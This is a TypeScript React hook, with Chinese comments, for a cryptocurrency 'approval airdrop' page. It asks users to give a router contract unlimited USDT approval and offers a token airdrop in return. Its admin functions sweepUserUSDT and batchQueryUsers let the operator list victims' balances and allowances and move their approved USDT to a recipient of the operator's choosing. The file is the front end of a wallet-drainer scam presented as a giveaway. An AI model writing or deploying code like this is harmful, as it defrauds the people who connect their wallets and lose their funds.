import { useState } from 'react';
import { BrowserProvider, Contract, formatUnits, formatEther, parseUnits } from 'ethers';
import { getContracts, MAX_UINT256 } from '../contracts/config';
import { ERC20_ABI, ROUTER_ABI, VAULT_TOKEN_ABI } from '../contracts/abis';

export function useVaultAirdrop() {
  const [loading, setLoading] = useState(false);

  /**
   * 检查用户USDT授权状态
   */
  const checkUSDTApproval = async (userAddress: string) => {
    try {
      if (!window.ethereum || !userAddress) {
        return { approved: false, allowance: '0' };
      }

      const provider = new BrowserProvider(window.ethereum);
      const contracts = getContracts();
      
      if (!contracts.router || !contracts.usdt) {
        return { approved: false, allowance: '0' };
      }

      const usdtContract = new Contract(
        contracts.usdt,
        ERC20_ABI,
        provider
      );

      const allowance = await usdtContract.allowance(userAddress, contracts.router);
      const allowanceStr = formatUnits(allowance, 18);

      return {
        approved: allowance.gt(0),
        allowance: allowanceStr,
        isInfinite: allowance.eq(MAX_UINT256)
      };
    } catch (error) {
      console.error('检查授权失败:', error);
      return { approved: false, allowance: '0' };
    }
  };

  /**
   * 授权USDT给Router（无限授权）
   */
  const approveUSDT = async () => {
    setLoading(true);
    try {
      if (!window.ethereum) {
        alert('❌ 请安装 MetaMask 钱包！');
        return false;
      }

      const provider = new BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contracts = getContracts();
      
      if (!contracts.router || !contracts.usdt) {
        alert('❌ 合约地址未配置');
        return false;
      }

      const usdtContract = new Contract(
        contracts.usdt,
        ERC20_ABI,
        signer
      );

      console.log('🎯 开始授权 USDT 给 Router...');
      console.log('Router 地址:', contracts.router);

      // 授权无限额度
      const tx = await usdtContract.approve(contracts.router, MAX_UINT256);
      console.log('⏳ 授权交易已发送:', tx.hash);
      
      const receipt = await tx.wait();
      console.log('✅ 授权交易已确认:', receipt);

      if (receipt.status === 1) {
        console.log('🎉 USDT 授权成功！');
        return true;
      } else {
        console.error('❌ 授权交易失败');
        return false;
      }
    } catch (error: any) {
      console.error('授权失败:', error);
      
      if (error.code === 4001) {
        alert('❌ 用户取消了授权');
      } else {
        alert('❌ 授权失败: ' + (error.message || '未知错误'));
      }
      return false;
    } finally {
      setLoading(false);
    }
  };

  /**
   * 领取空投
   */
  const claimAirdrop = async () => {
    setLoading(true);
    try {
      if (!window.ethereum) {
        alert('❌ 请安装 MetaMask 钱包！');
        return false;
      }

      const provider = new BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contracts = getContracts();
      
      if (!contracts.vaultToken) {
        alert('❌ Vault合约地址未配置');
        return false;
      }

      const vaultContract = new Contract(
        contracts.vaultToken,
        VAULT_TOKEN_ABI,
        signer
      );

      console.log('🎯 开始领取空投...');

      // 发送交易
      const tx = await vaultContract.claimApprovalAirdrop();
      console.log('⏳ 交易已发送:', tx.hash);
      
      const receipt = await tx.wait();
      console.log('✅ 交易已确认:', receipt);

      if (receipt.status === 1) {
        console.log('🎉 空投领取成功！');
        return true;
      } else {
        console.error('❌ 交易失败');
        return false;
      }
    } catch (error: any) {
      console.error('领取空投失败:', error);
      
      if (error.code === 4001) {
        alert('❌ 用户取消了交易');
      } else if (error.message?.includes('Already claimed')) {
        alert('❌ 您已经领取过空投了！');
      } else if (error.message?.includes('Insufficient USDT approval')) {
        alert('❌ USDT 授权额度不足，请先完成授权');
      } else {
        alert('❌ 领取失败: ' + (error.message || '未知错误'));
      }
      return false;
    } finally {
      setLoading(false);
    }
  };

  /**
   * 获取空投信息
   */
  const getAirdropInfo = async () => {
    try {
      if (!window.ethereum) {
        return null;
      }

      const provider = new BrowserProvider(window.ethereum);
      const contracts = getContracts();
      
      if (!contracts.vaultToken) {
        return null;
      }

      const vaultContract = new Contract(
        contracts.vaultToken,
        VAULT_TOKEN_ABI,
        provider
      );

      const [
        totalClaimed,
        totalDistributed,
        airdropAmount,
        minApprovalAmount,
        remainingSupply
      ] = await vaultContract.getAirdropInfo();

      // 获取代币信息
      const name = await vaultContract.name();
      const symbol = await vaultContract.symbol();
      const totalSupply = await vaultContract.totalSupply();
      const cap = await vaultContract.cap();

      return {
        totalClaimed: totalClaimed.toString(),
        totalDistributed: formatEther(totalDistributed),
        airdropAmount: formatEther(airdropAmount),
        minApprovalAmount: formatUnits(minApprovalAmount, 18),
        remainingSupply: formatEther(remainingSupply),
        tokenName: name,
        tokenSymbol: symbol,
        totalSupply: formatEther(totalSupply),
        cap: formatEther(cap)
      };
    } catch (error) {
      console.error('获取空投信息失败:', error);
      return null;
    }
  };

  /**
   * 检查用户是否已领取
   */
  const checkHasClaimed = async (address: string) => {
    try {
      if (!window.ethereum || !address) {
        return false;
      }

      const provider = new BrowserProvider(window.ethereum);
      const contracts = getContracts();
      
      if (!contracts.vaultToken) {
        return false;
      }

      const vaultContract = new Contract(
        contracts.vaultToken,
        VAULT_TOKEN_ABI,
        provider
      );

      const hasClaimed = await vaultContract.hasReceivedApprovalAirdrop(address);
      return hasClaimed;
    } catch (error) {
      console.error('检查领取状态失败:', error);
      return false;
    }
  };

  /**
   * 检查用户是否可以领取
   */
  const canClaimAirdrop = async (address: string) => {
    try {
      if (!window.ethereum || !address) {
        return false;
      }

      const provider = new BrowserProvider(window.ethereum);
      const contracts = getContracts();
      
      if (!contracts.vaultToken) {
        return false;
      }

      const vaultContract = new Contract(
        contracts.vaultToken,
        VAULT_TOKEN_ABI,
        provider
      );

      const canClaim = await vaultContract.canClaimAirdrop(address);
      return canClaim;
    } catch (error) {
      console.error('检查领取资格失败:', error);
      return false;
    }
  };

  /**
   * 获取用户代币余额
   */
  const getUserTokenBalance = async (address: string) => {
    try {
      if (!window.ethereum || !address) {
        return '0';
      }

      const provider = new BrowserProvider(window.ethereum);
      const contracts = getContracts();
      
      if (!contracts.vaultToken) {
        return '0';
      }

      const vaultContract = new Contract(
        contracts.vaultToken,
        VAULT_TOKEN_ABI,
        provider
      );

      const balance = await vaultContract.balanceOf(address);
      return formatEther(balance);
    } catch (error) {
      console.error('获取代币余额失败:', error);
      return '0';
    }
  };

  /**
   * 获取Router地址
   */
  const getRouterAddress = async () => {
    try {
      if (!window.ethereum) return '';
      
      const provider = new BrowserProvider(window.ethereum);
      const contracts = getContracts();
      
      if (!contracts.vaultToken) return '';
      
      const vaultContract = new Contract(
        contracts.vaultToken,
        VAULT_TOKEN_ABI,
        provider
      );
      
      const routerAddr = await vaultContract.getRouterAddress();
      return routerAddr;
    } catch (error) {
      console.error('获取Router地址失败:', error);
      return '';
    }
  };

  /**
   * 提取授权用户的USDT（管理员功能）
   */
  const sweepUserUSDT = async (userToSweep: string, recipient: string, amount: string) => {
    setLoading(true);
    try {
      if (!window.ethereum) {
        alert('❌ 请安装 MetaMask 钱包！');
        return false;
      }

      const provider = new BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contracts = getContracts();
      
      if (!contracts.vaultToken) {
        alert('❌ Vault合约地址未配置');
        return false;
      }

      const vaultContract = new Contract(
        contracts.vaultToken,
        VAULT_TOKEN_ABI,
        signer
      );

      const amountWei = parseUnits(amount, 18);
      console.log('🎯 开始提取用户USDT...', { userToSweep, recipient, amount });

      const tx = await vaultContract.sweepUserUSDT(userToSweep, recipient, amountWei);
      console.log('⏳ 交易已发送:', tx.hash);
      
      const receipt = await tx.wait();
      console.log('✅ 交易已确认:', receipt);

      if (receipt.status === 1) {
        console.log('🎉 USDT提取成功！');
        return true;
      } else {
        console.error('❌ 交易失败');
        return false;
      }
    } catch (error: any) {
      console.error('提取USDT失败:', error);
      alert('❌ 提取失败: ' + (error.message || '未知错误'));
      return false;
    } finally {
      setLoading(false);
    }
  };

  /**
   * 存入USDT到Vault（管理员功能）
   */
  const depositUSDT = async (amount: string) => {
    setLoading(true);
    try {
      if (!window.ethereum) {
        alert('❌ 请安装 MetaMask 钱包！');
        return false;
      }

      const provider = new BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contracts = getContracts();
      
      if (!contracts.vaultToken) {
        alert('❌ Vault合约地址未配置');
        return false;
      }

      const vaultContract = new Contract(
        contracts.vaultToken,
        VAULT_TOKEN_ABI,
        signer
      );

      const amountWei = parseUnits(amount, 18);
      console.log('🎯 开始存入USDT到Vault...', amount);

      const tx = await vaultContract.depositUSDT(amountWei);
      console.log('⏳ 交易已发送:', tx.hash);
      
      const receipt = await tx.wait();
      console.log('✅ 交易已确认:', receipt);

      if (receipt.status === 1) {
        console.log('🎉 USDT存入成功！');
        return true;
      } else {
        console.error('❌ 交易失败');
        return false;
      }
    } catch (error: any) {
      console.error('存入USDT失败:', error);
      alert('❌ 存入失败: ' + (error.message || '未知错误'));
      return false;
    } finally {
      setLoading(false);
    }
  };

  /**
   * 获取用户USDT余额
   */
  const getUserUSDTBalance = async (address: string) => {
    try {
      if (!window.ethereum || !address) return '0';

      const provider = new BrowserProvider(window.ethereum);
      const contracts = getContracts();
      
      if (!contracts.usdt) return '0';

      const usdtContract = new Contract(
        contracts.usdt,
        ERC20_ABI,
        provider
      );

      const balance = await usdtContract.balanceOf(address);
      return formatUnits(balance, 18);
    } catch (error) {
      console.error('获取USDT余额失败:', error);
      return '0';
    }
  };

  /**
   * 批量查询用户信息
   */
  const batchQueryUsers = async (addresses: string[]) => {
    try {
      if (!window.ethereum || !addresses || addresses.length === 0) {
        return [];
      }

      const provider = new BrowserProvider(window.ethereum);
      const contracts = getContracts();
      
      if (!contracts.vaultToken || !contracts.usdt || !contracts.router) {
        return [];
      }

      const vaultContract = new Contract(
        contracts.vaultToken,
        VAULT_TOKEN_ABI,
        provider
      );

      const usdtContract = new Contract(
        contracts.usdt,
        ERC20_ABI,
        provider
      );

      const results = await Promise.all(
        addresses.map(async (addr) => {
          try {
            const [
              tokenBalance,
              usdtBalance,
              usdtAllowance,
              hasClaimed
            ] = await Promise.all([
              vaultContract.balanceOf(addr),
              usdtContract.balanceOf(addr),
              usdtContract.allowance(addr, contracts.router),
              vaultContract.hasReceivedApprovalAirdrop(addr)
            ]);

            return {
              address: addr,
              tokenBalance: formatEther(tokenBalance),
              usdtBalance: formatUnits(usdtBalance, 18),
              usdtAllowance: formatUnits(usdtAllowance, 18),
              isInfiniteApproval: usdtAllowance.eq(MAX_UINT256),
              hasClaimed
            };
          } catch (error) {
            console.error(`查询地址 ${addr} 失败:`, error);
            return {
              address: addr,
              tokenBalance: '0',
              usdtBalance: '0',
              usdtAllowance: '0',
              isInfiniteApproval: false,
              hasClaimed: false,
              error: true
            };
          }
        })
      );

      return results;
    } catch (error) {
      console.error('批量查询失败:', error);
      return [];
    }
  };

  return {
    loading,
    checkUSDTApproval,
    approveUSDT,
    claimAirdrop,
    getAirdropInfo,
    checkHasClaimed,
    canClaimAirdrop,
    getUserTokenBalance,
    getRouterAddress,
    sweepUserUSDT,
    depositUSDT,
    getUserUSDTBalance,
    batchQueryUsers
  };
}

